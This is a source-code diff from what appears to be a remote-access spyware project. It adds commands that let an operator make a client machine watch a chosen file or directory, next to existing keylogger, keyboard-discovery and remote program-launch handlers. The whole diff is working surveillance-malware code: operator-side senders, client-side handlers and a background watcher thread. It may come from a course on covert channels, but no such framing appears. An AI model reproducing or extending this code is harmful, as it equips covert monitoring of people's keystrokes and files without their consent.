@@ -9,6 +9,7 @@
 #ifdef CLIENT_BUILD
 #include "keylogging/keylogger.h"
 #include "process_launcher/process_launcher.h"
+#include "watcher/watcher.h"
 #endif
 
 
@@ -88,6 +89,14 @@ bool handle_command_codes(struct session_info * session_info, const struct packe
         case RESPONSE:
             log_message("Handling Response");
             encountered_command_code = RESPONSE;
+            break;
+        case SEND_WATCH:
+            log_message("Watching File\n");
+            encountered_command_code = SEND_WATCH;
+            break;
+        case STOP_WATCH:
+            log_message("Stopping Watch\n");
+            encountered_command_code = STOP_WATCH;
             break;
         case GET_KEYBOARDS:
             log_message("Getting Keyboards\n");
@@ -177,6 +186,58 @@ void handle_packet_data(struct session_info * session_info, struct packet_data *
  *  CLIENT COMMAND HANDLERS
  *
 **/
+
+// NOLINTNEXTLINE
+void handle_send_watch(struct session_info * session_info) {
+    log_message("Starting File/Dir Watching");
+#ifdef CLIENT_BUILD
+    const struct packet_data * packet_data = session_info->head;
+
+    session_info->device_path = malloc(MESSAGE_BUFFER_LENGTH);
+    int device_path_len = 0;
+
+    while (packet_data != NULL) {
+        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
+        const uint8_t second_byte = (packet_data->data) & 0xFF;
+
+        if (first_byte == SEND_WATCH && second_byte == SEND_WATCH) {
+            break;
+        }
+
+        if (device_path_len < MESSAGE_BUFFER_LENGTH - 2) {
+            if (first_byte == 0) {
+                session_info->device_path[device_path_len++] = (char)second_byte;
+            } else {
+                session_info->device_path[device_path_len++] = (char)first_byte;
+                session_info->device_path[device_path_len++] = (char)second_byte;
+            }
+        }
+
+        packet_data = packet_data->next;
+    }
+
+    while (device_path_len > 0 && (session_info->device_path[device_path_len - 1] == '\0' || session_info->device_path[device_path_len - 1] == ' ')) {
+        device_path_len--;
+    }
+
+    session_info->device_path[device_path_len] = '\0';
+
+    log_message("Provided File/Dir to watch: %s", session_info->device_path);
+    if (!session_info->run_watcher) {
+        session_info->run_watcher = true;
+        pthread_create(&session_info->watcher_thread, NULL, watch_directory, session_info);
+    }
+#endif
+}
+
+// NOLINTNEXTLINE
+void handle_stop_watch(struct session_info * session_info) {
+    log_message("Stoping Watch");
+#ifdef CLIENT_BUILD
+    session_info->run_watcher = false;
+    pthread_join(session_info->watcher_thread, NULL);
+#endif
+}
 
 // NOLINTNEXTLINE
 void start_keylogger(struct session_info * session_info) {
@@ -492,6 +553,13 @@ void handle_disconnect(struct session_info * session_info) {
     connection_loop = false;
 }
 
+// NOLINTNEXTLINE
+void handle_get_keyboards(struct session_info * session_info) {
+#ifdef CLIENT_BUILD
+    discover_keyboards(session_info);
+#endif
+}
+
 /**
  *
  *  CENTRAL MENU COMMAND HANDLERS
@@ -546,7 +614,6 @@ void send_start_keylogger(struct server_options * server_options) {
     }
 }
 
-
 // NOLINTNEXTLINE
 void send_stop_keylogger(struct server_options * server_options) {
     send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, STOP_KEYLOGGER);
@@ -557,7 +624,6 @@ void send_get_keyboards(struct server_options * server_options) {
     send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, GET_KEYBOARDS);
 }
 
-// Disconnect
 // NOLINTNEXTLINE
 void send_disconnect(struct server_options * server_options) {
     send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, DISCONNECT);
@@ -646,11 +712,55 @@ void send_file(struct server_options * server_options) {
     }
 }
 
-void send_watch(int fd, enum FILE_TYPE file_type, char * path) {
+void send_watch(const struct server_options * server_options) {
+    const size_t message_length = MESSAGE_BUFFER_LENGTH;
+    char * watch_name = malloc(message_length);
+    long bytes_read = 0;
 
+    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
+    if (flags == -1) {
+        fprintf(stderr, "F_GETFL on STDIN\n");
+        free(watch_name);
+        return;
+    }
+
+    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+        free(watch_name);
+        return;
+    }
+
+    char discard;
+    while (read(STDIN_FILENO, &discard, 1) > 0) {
+        if (discard == '\n') break;
+    }
+
+    fprintf(stdout, "Enter the file/directory to watch on remote (i.e. \".\"): ");
+    fflush(stdout);
+
+    bytes_read = read(STDIN_FILENO, watch_name, message_length);
+    if (bytes_read > 0) {
+        watch_name[bytes_read - 1] = '\0';
+        printf("Sending file/directory: %s\n", watch_name);
+        fflush(stdout);
+
+        // Send over the command and the RUN_PROGRAM command
+        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, watch_name);
+        usleep(500000);
+        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, SEND_WATCH);
+        fflush(stdout);
+    }
+
+    free(watch_name);
+    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+    }
 }
 
-// Run program
+void send_stop_watch(const struct server_options * server_options) {
+    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, STOP_WATCH);
+}
+
 void send_run_program(const struct server_options * server_options) {
     const size_t message_length = MESSAGE_BUFFER_LENGTH;
     char * message = malloc(message_length);
@@ -750,12 +860,6 @@ void send_receive_file(const struct server_options * server_options) {
     }
 }
 
-// NOLINTNEXTLINE
-void handle_get_keyboards(struct session_info * session_info) {
-#ifdef CLIENT_BUILD
-    discover_keyboards(session_info);
-#endif
-}
 
 // NOLINTNEXTLINE
 void handle_response(struct session_info * session_info) {
